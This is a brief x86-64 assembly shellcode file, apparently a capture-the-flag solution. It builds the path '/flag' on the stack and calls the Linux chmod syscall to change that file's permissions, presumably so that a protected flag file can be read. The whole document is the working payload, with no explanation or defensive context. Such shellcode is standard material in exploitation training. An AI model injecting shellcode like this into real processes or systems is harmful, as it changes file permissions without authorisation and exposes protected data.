.global _start
_start:
.intel_syntax noprefix
        mov al, 0x5a
	xor esi, esi
	mov sil, 0x2d
	push 0x2f
	mov dword ptr [rsp+1], 0x67616c66
	mov rdi, rsp
	syscall
